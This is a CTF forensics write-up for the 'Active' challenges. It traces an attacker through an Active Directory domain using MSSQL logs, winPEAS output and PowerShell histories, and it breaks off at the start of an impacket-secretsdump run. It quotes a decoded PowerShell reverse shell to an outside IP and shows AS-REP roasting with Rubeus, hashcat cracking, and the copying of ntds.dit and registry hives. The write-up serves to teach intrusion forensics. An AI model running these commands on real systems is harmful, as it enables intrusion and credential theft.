Will run 4 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status 0g 0:00:00:47 0.35% (ETA: 02:50:40) 0g/s 1297p/s 1297c/s 1297C/s 159753159753..141106 goblue1 (Database) 1g 0:00:01:10 DONE (2025-03-09 23:09) 0.01424g/s 1269p/s 1269c/s 1269C/s gobucks1..giana Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. Flag:\nwctf{1_th0ught_1t_w4s_s3cur3?} Active 1: Domain Access # Challenge Description #Oh no! Our beloved wolvctf.corp domain has been infiltrated! How did they manage to break into our domain controller? Please figure out how they got access into the domain controller box, how a shell was achieved, and how a domain account was obtained.\nWe have provided just the user accounts because the attacker did not cover their tracks very well.\nUsers_Backup.zip\u0026rsquo;s password is wolvctf\nsha256sum:709b595d63ac9660b9c67de357337ee55ffd6658412b8c5c27b35efc05617893\nFlag is split up into 3 parts.\nhttps://drive.google.com/drive/folders/11MzaiPYvosPSYlKzqqAVX_muiv5p4yQA?usp=sharing\nSolve #Part 1 - Infiltration #┌──(kali㉿kali)-[~/ctf/Active/challenge/Users - Copy] └─$ cat mssql_service/MSSQL13.SQLEXPRESS/MSSQL/Log/ERRORLOG ��2025-03-18 12:28:55.12 Server Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64) Mar 18 2018 09:11:49 Copyright (c) Microsoft Corporation Express Edition (64-bit) on Windows Server 2019 Standard Evaluation 10.0 \u0026lt;X64\u0026gt; (Build 17763: ) (Hypervisor) 2025-03-18 12:28:55.13 Server UTC adjustment: -7:00 ... 2025-03-18 12:29:14.04 Server Software Usage Metrics is disabled. 2025-03-18 13:28:27.74 spid52 Using \u0026#39;dbghelp.dll\u0026#39; version \u0026#39;4.0.5\u0026#39; 2025-03-18 19:51:14.50 Logon Error: 18456, Severity: 14, State: 5. 2025-03-18 19:51:14.50 Logon Login failed for user \u0026#39;root\u0026#39;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1] 2025-03-18 19:51:15.13 Logon Error: 18456, Severity: 14, State: 5. 2025-03-18 19:51:15.13 Logon Login failed for user \u0026#39;test\u0026#39;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1] 2025-03-18 19:51:15.74 Logon Error: 18456, Severity: 14, State: 5. 2025-03-18 19:51:15.74 Logon Login failed for user \u0026#39;admin\u0026#39;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1] 2025-03-18 19:51:16.32 Logon Error: 18456, Severity: 14, State: 5. 2025-03-18 19:51:16.32 Logon Login failed for user \u0026#39;bruteforcing\u0026#39;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1] 2025-03-18 19:51:17.00 Logon Error: 18456, Severity: 14, State: 5. 2025-03-18 19:51:17.00 Logon Login failed for user \u0026#39;this\u0026#39;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1] 2025-03-18 19:51:17.85 Logon Error: 18456, Severity: 14, State: 5. 2025-03-18 19:51:17.85 Logon Login failed for user \u0026#39;is\u0026#39;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1] 2025-03-18 19:51:18.43 Logon Error: 18456, Severity: 14, State: 5. 2025-03-18 19:51:18.43 Logon Login failed for user \u0026#39;the\u0026#39;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1] 2025-03-18 19:51:19.05 Logon Error: 18456, Severity: 14, State: 5. 2025-03-18 19:51:19.05 Logon Login failed for user \u0026#39;first\u0026#39;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1] 2025-03-18 19:51:19.69 Logon Error: 18456, Severity: 14, State: 5. 2025-03-18 19:51:19.69 Logon Login failed for user \u0026#39;part\u0026#39;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1] 2025-03-18 19:51:20.31 Logon Error: 18456, Severity: 14, State: 5. 2025-03-18 19:51:20.31 Logon Login failed for user \u0026#39;w\u0026#39;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1] 2025-03-18 19:51:20.86 Logon Error: 18456, Severity: 14, State: 5. 2025-03-18 19:51:20.86 Logon Login failed for user \u0026#39;c\u0026#39;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1] 2025-03-18 19:51:21.68 Logon Error: 18456, Severity: 14, State: 5. 2025-03-18 19:51:21.68 Logon Login failed for user \u0026#39;t\u0026#39;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1] 2025-03-18 19:51:22.30 Logon Error: 18456, Severity: 14, State: 5. 2025-03-18 19:51:22.30 Logon Login failed for user \u0026#39;f\u0026#39;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1] 2025-03-18 19:51:23.12 Logon Error: 18456, Severity: 14, State: 5. 2025-03-18 19:51:23.12 Logon Login failed for user \u0026#39;{\u0026#39;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1] 2025-03-18 19:51:23.96 Logon Error: 18456, Severity: 14, State: 5. 2025-03-18 19:51:23.96 Logon Login failed for user \u0026#39;d\u0026#39;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1] 2025-03-18 19:51:24.56 Logon Error: 18456, Severity: 14, State: 5. 2025-03-18 19:51:24.56 Logon Login failed for user \u0026#39;0\u0026#39;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1] 2025-03-18 19:51:25.22 Logon Error: 18456, Severity: 14, State: 5. 2025-03-18 19:51:25.22 Logon Login failed for user \u0026#39;n\u0026#39;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1] 2025-03-18 19:51:25.82 Logon Error: 18456, Severity: 14, State: 5. 2025-03-18 19:51:25.82 Logon Login failed for user \u0026#39;t\u0026#39;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1] 2025-03-18 19:51:26.49 Logon Error: 18456, Severity: 14, State: 5. 2025-03-18 19:51:26.49 Logon Login failed for user \u0026#39;_\u0026#39;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1] 2025-03-18 19:51:27.21 Logon Error: 18456, Severity: 14, State: 5. 2025-03-18 19:51:27.21 Logon Login failed for user \u0026#39;3\u0026#39;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1] 2025-03-18 19:51:27.93 Logon Error: 18456, Severity: 14, State: 5. 2025-03-18 19:51:27.93 Logon Login failed for user \u0026#39;n\u0026#39;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1] 2025-03-18 19:51:28.60 Logon Error: 18456, Severity: 14, State: 5. 2025-03-18 19:51:28.60 Logon Login failed for user \u0026#39;4\u0026#39;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1] 2025-03-18 19:51:29.11 Logon Error: 18456, Severity: 14, State: 5. 2025-03-18 19:51:29.11 Logon Login failed for user \u0026#39;b\u0026#39;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1] 2025-03-18 19:51:29.64 Logon Error: 18456, Severity: 14, State: 5. 2025-03-18 19:51:29.64 Logon Login failed for user \u0026#39;l\u0026#39;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1] 2025-03-18 19:51:30.29 Logon Error: 18456, Severity: 14, State: 5. 2025-03-18 19:51:30.29 Logon Login failed for user \u0026#39;3\u0026#39;. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1] 2025-03-18 19:51:55.62 spid54 Configuration option \u0026#39;show advanced options\u0026#39; changed from 1 to 1. Run the RECONFIGURE statement to install. 2025-03-18 19:51:55.63 spid54 Configuration option \u0026#39;xp_cmdshell\u0026#39; changed from 1 to 1. Run the RECONFIGURE statement to install. 2025-03-18 19:51:58.29 spid54 Configuration option \u0026#39;xp_cmdshell\u0026#39; changed from 1 to 0. Run the RECONFIGURE statement to install. 2025-03-18 19:51:58.33 spid54 Configuration option \u0026#39;show advanced options\u0026#39; changed from 1 to 0. Run the RECONFIGURE statement to install. 2025-03-18 21:14:25.14 spid5s SQL Server is terminating in response to a \u0026#39;stop\u0026#39; request from Service Control Manager. This is an informational message only. No user action is required. 2025-03-18 21:14:26.61 spid13s Service Broker manager has shut down. 2025-03-18 21:14:26.65 spid5s .NET Framework runtime has been stopped. 2025-03-18 21:14:27.51 spid5s SQL Server shutdown has been initiated 2025-03-18 21:14:27.53 spid5s SQL Trace was stopped due to server shutdown. Trace ID = \u0026#39;1\u0026#39;. This is an informational message only; no user action is required. If we look at the invalid logons, we can see the attacker trying to brute force credentials. This spells out the first part of the flag,\nwctf{d0nt_3n4bl3_ Part 2 - Shell Access #┌──(kali㉿kali)-[~/ctf/Active/challenge/Users - Copy] └─$ cat Public/Documents/winPEASOutput.txt ��ANSI color bit for Windows is not set. If you are executing this from a Windows terminal inside the host you should run \u0026#39;REG ADD HKCU\\Console /v VirtualTerminalLevel /t REG_DWORD /d 1\u0026#39; and then start a new CMD Long paths are disabled, so the maximum length of a path supported is 260 chars (this may cause false negatives when looking for files). If you are admin, you can enable it with \u0026#39;REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem /v VirtualTerminalLevel /t REG_DWORD /d 1\u0026#39; and then start a new CMD ... Lets check the processes information in winpeas to see if any XP_CMDSHELl commands were run by the MSSQL user:\nP%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%c% Processes Information `%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P% T%P%P%P%P%P%P%P%P%P%P%c% Interesting Processes -non Microsoft- Z% Check if any interesting processes for memory dump or if you could overwrite some binary running https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#running-processes conhost(7856)[C:\\Windows\\system32\\conhost.exe] -- POwn: MSSQL$SQLEXPRESS Command Line: \\??\\C:\\Windows\\system32\\conhost.exe 0x4 ================================================================================================= cmd(1620)[C:\\Windows\\system32\\cmd.exe] -- POwn: MSSQL$SQLEXPRESS Command Line: \u0026#34;C:\\Windows\\system32\\cmd.exe\u0026#34; /c powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAOAA3AC4AMQAyADgAIgAsADEANAAzADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAZQBuAGMAbwBkAGUAZABfAGYAbABhAGcAcAB0ADIAIAA9ACAAIgBYADMAaABRAFgAMgBOAHQAWgBIAE4AbwBNAHoARQB4AFgAMwBjAHgAZABHAGgAZgBaAEQATgBtAFkAWABWAHMAZABGADkAagBjAGoATgBrAGMAMQA4AHcAYwBsADgAPQBzACIAOwAkAGYAbABhAGcAcAB0ADIAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQAZQBuAGMAbwBkAGUAZABfAGYAbABhAGcAcAB0ADIAKQApADsAVwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAkAGYAbABhAGcAcAB0ADIAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA== ================================================================================================= winPEASx64(8144)[C:\\Users\\Public\\Documents\\winPEASx64.exe] -- POwn: MSSQL$SQLEXPRESS -- isDotNet Permissions: MSSQL$SQLEXPRESS [AllAccess], Service [WriteData/CreateFiles] Possible DLL Hijacking folder: C:\\Users\\Public\\Documents (Service [WriteData/CreateFiles]) Command Line: \u0026#34;C:\\Users\\Public\\Documents\\winPEASx64.exe\u0026#34; all ================================================================================ to decode https://cyberchef.org/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Decode_text('UTF-16LE%20(1200)')\n$client = New-Object System.Net.Sockets.TCPClient(\u0026#34;192.168.187.128\u0026#34;,1433);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2\u0026gt;\u0026amp;1 | Out-String );$sendback2 = $sendback + \u0026#34;PS \u0026#34; + (pwd).Path + \u0026#34;\u0026gt; \u0026#34;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$encoded_flagpt2 = \u0026#34;X3hQX2NtZHNoMzExX3cxdGhfZDNmYXVsdF9jcjNkc18wcl8=s\u0026#34;;$flagpt2 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded_flagpt2));Write-Output $flagpt2;$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() We can see the flagpart2 variable in there\nFlag part 2:\n_xP_cmdsh311_w1th_d3fault_cr3ds_0r_ Part 3 - Getting a domain user #Read winpeas output again\n┌──(kali㉿kali)-[~/ctf/Active/challenge/Users - Copy] └─$ cat Public/Documents/winPEASOutput.txt ��ANSI color bit for Windows is not set. If you are executing this from a Windows terminal inside the host you should run \u0026#39;REG ADD HKCU\\Console /v VirtualTerminalLevel /t REG_DWORD /d 1\u0026#39; and then start a new CMD Long paths are disabled, so the maximum length of a path supported is 260 chars (this may cause false negatives when looking for files). If you are admin, you can enable it with \u0026#39;REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem /v VirtualTerminalLevel /t REG_DWORD /d 1\u0026#39; and then start a new CMD ... T%P%P%P%P%P%P%P%P%P%P%c% Looking for AutoLogon credentials Some AutoLogon credentials were found DefaultDomainName : WOLVCTF DefaultUserName : WOLVCTF\\Dan DefaultPassword : DansSuperCoolPassw0rd!! AltDefaultUserName : loot-in-hex:656e61626c335f347574306c6f67306e5f306b3f3f213f7d Here we can see a domain user\u0026rsquo;s credentials in the Autologon! And some loot in the AltDefaultUserName, Lets decode using cyberchef:\nhttps://cyberchef.org/#recipe=From_Hex('Auto')\u0026input=NjU2ZTYxNjI2YzMzNWYzNDc1NzQzMDZjNmY2NzMwNmU1ZjMwNmIzZjNmMjEzZjdk\nFlag part 3:\nenabl3_4ut0log0n_0k??!?} Final Flag #wctf{d0nt_3n4bl3_xP_cmdsh311_w1th_d3fault_cr3ds_0r_enabl3_4ut0log0n_0k??!?} Active 2: Lateral Movement # Challenge Description #The attacker moved laterally throughout our domain. I\u0026rsquo;m hearing reports from other members of wolvctf.corp that 3 lower level accounts were compromised (excluding the 2 higher level compromised accounts). Figure out which ones these are, and follow the attacker\u0026rsquo;s steps to collect the flag.\nUsers_Backup.zip\u0026rsquo;s password is wolvctf\nsha256sum:709b595d63ac9660b9c67de357337ee55ffd6658412b8c5c27b35efc05617893\nFlag is split up into 3 parts.\nhttps://drive.google.com/drive/folders/11MzaiPYvosPSYlKzqqAVX_muiv5p4yQA?usp=sharing\nSolve #Part 1: Enumerating Dan\u0026rsquo;s Account #Since the attacker got access to dan\u0026rsquo;s account, lets check their powershell logs for any actions\n┌──(kali㉿kali)-[~/ctf/Active/challenge/Users - Copy] └─$ cat dan/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt cd Desktop Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\\Users\\dan\\Documents -OutputPrefix \u0026#34;wolvctf_audit\u0026#34; powershell -ep bypass .\\SharpHound.ps1 Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\\Users\\dan\\Documents -OutputPrefix \u0026#34;wolvctf_audit\u0026#34; Import-Module \\SharpHound.ps1 Import-Module .\\SharpHound.ps1 Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\\Users\\dan\\Documents -OutputPrefix \u0026#34;wolvctf_audit\u0026#34; .\\Rubeus.exe asreproast /user:emily /domain:wolvctf.corp /dc:DC01.wolvctf.corp \u0026gt; asreproast.output .\\Rubeus.exe kerberoast \u0026gt; kerberoast.output runas /User:wolvctf\\emily cmd Looks like they saved hashes obtained by Rubeus in some files, lets check the ASREPRoasted one:\n┌──(kali㉿kali)-[~/ctf/Active/challenge/Users - Copy] └─$ cat dan/Desktop/asreproast.output �� ______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___) | | \\ \\| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v2.2.0 [*] Action: AS-REP roasting [*] Target User : emily [*] Target Domain : wolvctf.corp [*] Target DC : DC01.wolvctf.corp [*] Using domain controller: DC01.wolvctf.corp (fe80::af8f:bc46:1257:36be%5) [*] Building AS-REQ (w/o preauth) for: \u0026#39;wolvctf.corp\\emily\u0026#39; [+] AS-REQ w/o preauth successful! [*] AS-REP hash: $krb5asrep$emily@wolvctf.corp:34C3460101DA5A3081FA4F6518A0ECE1$619944A029EF908C7 8A80E2559C06788E2D86AEB1C94CD97E4540E5EA57C550C7FBD768D6EA24DBC66CFC6B8A9E39C364 39CA4B50DCF29F3C078785F876835B239B3628F561D080F83294C9A3BC8D1C4DEC538A15339257DC AAB20F33EE168BDEA0671C4AB92DA6B089D7700E7BE42564706BFA903654EDF11376C1994BBE6B9C C65E53275EF3148B638AA5A52284E29912C3CA2171FD50FBD6929511416B51F8C4F8CB9383DA74E8 DB3B0493A2654093C44BC399695525DD90E271A90C9992024A1D05E4188EC588663D2D849142AED6 5C5B77C38ED3DC7BB65178A565248F199B5DC2D382D2DA016DAD023 [*_*] d2N0Znthc3IzcHIwNHN0M2Q/Xw== The attacker ran Rubeus to obtain the ASREPRoasted hash, and appended the first part of the flag to the output file:\nhttps://cyberchef.org/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)\u0026input=ZDJOMFpudGhjM0l6Y0hJd05ITjBNMlEvWHc9PSA\nFlag part 1:\nwctf{asr3pr04st3d?_ Flag Part 2: Enumerating Emily\u0026rsquo;s account #Lets clean up the hash from before\n$krb5asrep$emily@wolvctf.corp:34C3460101DA5A3081FA4F6518A0ECE1$619944A029EF908C78A80E2559C06788E2D86AEB1C94CD97E4540E5EA57C550C7FBD768D6EA24DBC66CFC6B8A9E39C36439CA4B50DCF29F3C078785F876835B239B3628F561D080F83294C9A3BC8D1C4DEC538A15339257DCAAB20F33EE168BDEA0671C4AB92DA6B089D7700E7BE42564706BFA903654EDF11376C1994BBE6B9CC65E53275EF3148B638AA5A52284E29912C3CA2171FD50FBD6929511416B51F8C4F8CB9383DA74E8DB3B0493A2654093C44BC399695525DD90E271A90C9992024A1D05E4188EC588663D2D849142AED65C5B77C38ED3DC7BB65178A565248F199B5DC2D382D2DA016DAD023 and attempt to crack it with rockyou\n┌──(kali㉿kali)-[~/ctf/Active/challenge/scratch] └─$ sudo hashcat -m 18200 asreproast.hash /usr/share/wordlists/rockyou.txt --force [sudo] password for kali: hashcat (v6.2.6) starting You have enabled --force to bypass dangerous warnings and errors! This can hide serious problems and should only be done when debugging. Do not report hashcat issues encountered when using --force. ... $krb5asrep$emily@wolvctf.corp:34c3460101da5a3081fa4f6518a0ece1$619944a029ef908c78a80e2559c06788e2d86aeb1c94cd97e4540e5ea57c550c7fbd768d6ea24dbc66cfc6b8a9e39c36439ca4b50dcf29f3c078785f876835b239b3628f561d080f83294c9a3bc8d1c4dec538a15339257dcaab20f33ee168bdea0671c4ab92da6b089d7700e7be42564706bfa903654edf11376c1994bbe6b9cc65e53275ef3148b638aa5a52284e29912c3ca2171fd50fbd6929511416b51f8c4f8cb9383da74e8db3b0493a2654093c44bc399695525dd90e271a90c9992024a1d05e4188ec588663d2d849142aed65c5b77c38ed3dc7bb65178a565248f199b5dc2d382d2da016dad023:youdontknowmypasswordhaha Session..........: hashcat Status...........: Cracked Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP) Hash.Target......: $krb5asrep$emily@wolvctf.corp:34c3460101da5a3081fa4...dad023 Time.Started.....: Wed Mar 19 00:58:29 2025, (5 secs) Time.Estimated...: Wed Mar 19 00:58:34 2025, (0 secs) Kernel.Feature...: Pure Kernel Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 514.2 kH/s (1.02ms) @ Accel:256 Loops:1 Thr:1 Vec:8 Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new) Progress.........: 2574336/14344385 (17.95%) Rejected.........: 0/2574336 (0.00%) Restore.Point....: 2573312/14344385 (17.94%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidate.Engine.: Device Generator Candidates.#1....: youkids -\u0026gt; youarehot1 Hardware.Mon.#1..: Util: 64% Started: Wed Mar 19 00:58:27 2025 Stopped: Wed Mar 19 00:58:36 2025 Now that Emily\u0026rsquo;s password was able to be obtained via rockyou, lets check her powershell history to see what the attacker did next:\n┌──(kali㉿kali)-[~/ctf/Active/challenge/Users - Copy] └─$ cat emily/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt cd C:\\Users\\emily tree /f /a \u0026gt; tree.txt type tree.txt cd Documents dir type README echo \u0026#34;James asked me to keep his password secret, so I made sure to take extra precautions.\u0026#34; \u0026gt;\u0026gt; C:\\Users\\Public\\loot.txt echo \u0026#34;Note to self: Password for the zip is same as mine, with 777 at the end\u0026#34; \u0026gt;\u0026gt; C:\\Users\\Public\\loot.txt del README cp .\\important.7z C:\\Users\\Public del C:\\Users\\Public\\loot.txt del C:\\Users\\Public\\important.7z runas /User:wolvctf\\james cmd So it looks like the attacker deleted a README file containing the following:\nJames asked me to keep his password secret, so I made sure to take extra precautions. Password for the zip is same as mine, with 777 at the end In her directory we also see the following\n──(kali㉿kali)-[~/ctf/Active/challenge/Users - Copy] └─$ cat emily/tree.txt ��Folder PATH listing Volume serial number is 1E33-4D3F C:. | tree.txt | +---Desktop +---Documents | important.7z | README | +---Downloads +---Favorites +---Links +---Music +---Pictures +---Saved Games \\---Videos ┌──(kali㉿kali)-[~/ctf/Active/challenge/Users - Copy] └─$ Luckily for us, the important.7z is still there. Since we know her password, lets try using what the README said and do the following\n┌──(kali㉿kali)-[~/ctf/Active/challenge/Users - Copy] └─$ cp emily/Documents/important.7z ../scratch/ ┌──(kali㉿kali)-[~/ctf/Active/challenge/Users - Copy] └─$ cd ../scratch ┌──(kali㉿kali)-[~/ctf/Active/challenge/scratch] └─$ 7z x -p\u0026#34;youdontknowmypasswordhaha777\u0026#34; important.7z 7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024, ASM Scanning the drive for archives: 1 file, 2220152 bytes (2169 KiB) Extracting archive: important.7z -- Path = important.7z Type = 7z Physical Size = 2220152 Headers Size = 264 Method = LZMA2:3m 7zAES Solid = + Blocks = 1 Everything is Ok Folders: 1 Files: 3 Size: 2252831 Compressed: 2220152 Looks like the extraction worked!\nNow lets see if there\u0026rsquo;s anything we can do with these files\n┌──(kali㉿kali)-[~/…/Active/challenge/scratch/important] └─$ binwalk car.jpeg DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 JPEG image data, JFIF standard 1.01 9296 0x2450 JPEG image data, JFIF standard 1.01 ┌──(kali㉿kali)-[~/…/Active/challenge/scratch/important] └─$ dd if=car.jpeg of=extracted_hidden.jpg bs=1 skip=9296 67772+0 records in 67772+0 records out 67772 bytes (68 kB, 66 KiB) copied, 0.120803 s, 561 kB/s Binary walking car.jpg reveals another photo hidden inside. This contains James\u0026rsquo;s password, along with the second part of the flag\nsh0uldv3_3nabl3d_s0m3_k3b3r0s_pr34th_4nd_ Part 3: Enumerating James\u0026rsquo;s Account #Same as before, check James\u0026rsquo;s history\n┌──(kali㉿kali)-[~/ctf/Active/challenge/Users - Copy] └─$ cat james/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt cd C:\\Users\\Public\\Documents mv .\\PowerView.txt .\\PowerView.ps1 powershell -ep bypass Import-Module .\\PowerView.ps1 Find-DomainProcess $NewPassword = ConvertTo-SecureString \u0026#39;Password123!\u0026#39; -AsPlainText -Force` Set-DomainUserPassword -Identity \u0026#39;emily\u0026#39; -AccountPassword $NewPassword $NewPassword = ConvertTo-SecureString \u0026#39;d0nt_us3_4ll3xtendedr1ghts}\u0026#39; -AsPlainText -Force` Set-DomainUserPassword -Identity \u0026#39;patrick\u0026#39; -AccountPassword $NewPassword runas /User:wolvctf\\patrick cmd We can see in the Bloodhound output that James has AllExtendedRigts to both Emily and Patrick. It appears as Patrick\u0026rsquo;s new password is the third part of the flag:\nd0nt_us3_4ll3xtendedr1ghts} Final flag #wctf{asr3pr04st3d?_sh0uldv3_3nabl3d_s0m3_k3b3r0s_pr34th_4nd_d0nt_us3_4ll3xtendedr1ghts} Active 3: Domain Admin # Challenge Description #Now, it\u0026rsquo;s time to figure out how this attacker obtained administrator access on our domain! To prove you have retraced the attacker\u0026rsquo;s steps completely, submit the domain admin\u0026rsquo;s password as the flag. It\u0026rsquo;s already in the flag format.\nUsers_Backup.zip\u0026rsquo;s password is wolvctf\nsha256sum:709b595d63ac9660b9c67de357337ee55ffd6658412b8c5c27b35efc05617893\nhttps://drive.google.com/drive/folders/11MzaiPYvosPSYlKzqqAVX_muiv5p4yQA?usp=sharing\nSolve #Part 1: Obtaining Jessica\u0026rsquo;s password hash #Lets pick up where we left off with part 2 and scan the newly taken over account, Patrick\u0026rsquo;s\n┌──(kali㉿kali)-[~/ctf/Active/challenge/Users - Copy] └─$ cat patrick/Desktop/note_from_jake.txt If you need anything backed up you can just use my account: Password: fwa3fe8#FEwef Now, lets check Jake\u0026rsquo;s\ncat jake/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt ┌──(kali㉿kali)-[~/ctf/Active/challenge/Users - Copy] └─$ cat jake/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt cd C:\\Users\\Public\\Downloads whoami cd C:\\Users\\jake\\desktop whoami /all \u0026gt; whoami.txt type .\\whoami.txt cd C:\\Users\\public cd downloads diskshadow.exe /s script.txt diskshadow.exe /s script.txt \u0026gt; shadow.txt type .\\shadow.txt cp .\\shadow.txt C:\\Users\\jake\\desktop\\shadow.txt del shadow.txt robocopy /b z:\\windows\\ntds . ntds.dit \u0026gt; robo.txt type .\\robo.txt dir del robo.txt cp ntds.dit C:\\Users\\jake\\downloads del ntds.dit cd C:\\Users\\jake\\downloads dir reg save hklm\\system c:\\users\\jake\\downloads\\system.hive reg save hklm\\sam C:\\users\\jake\\downloads\\sam.hive dir cp * C:\\Users\\public del C:\\Users\\public\\ntds.dit del C:\\Users\\public\\sam.hive del C:\\Users\\public\\system.hive runas /User:wolvctf\\jessica runas /User:wolvctf\\jessica cmd We can see that they used diskshadow to perform a volume shadow copy of the NTDS, SAM hive, and SYSTEM hive. Let\u0026rsquo;s use impacket to dump those secrets\nimpacket-secretsdump -ntds ntds.dit -system system.hive -sam sam.hive LOCAL ┌──(kali㉿kali)-[~/…/challenge/Users - Copy/jake/Downloads] └─$ impacket-secretsdump -ntds ntds.dit -system system.hive -sam sam.hive LOCAL Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Target system bootKey: 0x32032d8f6ff9102e4202d192c152e02a [*] Dumping local SAM hashes (uid:rid:lmhash:nthash) 